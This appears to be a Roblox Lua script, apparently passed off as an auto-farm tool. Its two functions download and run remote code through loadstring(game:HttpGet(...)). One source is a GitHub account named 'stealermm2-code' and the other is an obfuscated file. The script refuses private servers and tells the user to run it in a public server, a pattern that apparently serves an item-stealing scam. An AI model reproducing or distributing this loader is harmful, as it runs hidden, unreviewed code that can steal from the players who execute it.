local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function main()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/stealermm2-code/yedek/refs/heads/main/yedel3'))()
end

local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/CapybaraScript/Key1-/refs/heads/main/keyv4-obfuscated.lua"))()
end

-- Sunucu kontrolü
local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()

if not isVIPServer then
    task.spawn(main)
    task.spawn(farm)
else
    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
end
